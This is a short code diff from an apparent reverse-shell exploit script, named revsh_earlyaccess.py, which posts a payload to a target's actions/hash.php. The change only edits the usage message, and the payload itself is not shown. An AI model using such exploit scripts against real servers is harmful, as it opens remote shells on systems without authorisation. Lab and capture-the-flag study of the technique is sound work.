@@ -30,5 +30,5 @@ if len(sys.argv) == 3:
         }
         r = requests.post(target + "actions/hash.php", data=payload, verify=False)
 else:
-    print(f"[!] Usage: python3 {sys.argv[0]} <local_ip> <local_port>")
+    print(f"[!] Usage: python3 revsh_earlyaccess.py <local_ip> <local_port>")
     sys.exit(1)
